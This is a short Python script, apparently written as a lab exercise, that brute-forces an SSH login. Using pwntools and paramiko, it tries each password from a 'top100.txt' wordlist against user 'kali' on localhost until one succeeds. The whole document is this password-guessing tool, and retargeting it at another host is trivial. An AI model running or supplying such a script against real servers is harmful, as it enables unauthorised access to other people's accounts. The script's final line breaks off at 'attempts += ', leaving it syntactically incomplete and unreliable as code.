from pwn import *
import paramiko

# Setting our variables
host = '127.0.0.1'
attempts = 1
port = 22
username = 'kali'

# Iterating through the text file 'top100'
with open('top100.txt', 'r') as password_list:
    for password in password_list:
        password = password.strip('\n')

        # Error handling using try()
        try:
            print("Attempt number {} with password: '{}'".format(attempts, password))

            # Details for the SSH login
            bruteforce = ssh(password=password, user=username, host=host, port=port, timeout=1)

            # What happens if the SSH login is successful
            if bruteforce.connected():
                print("Successful login, password was {} on attempt {}".format(password, attempts))
                bruteforce.close()
                break
            bruteforce.close()

        # What happens if the password for the SSH login is incorrect
        except paramiko.ssh_exception.AuthenticationException:
            print('Invalid Password')
        attempts += 
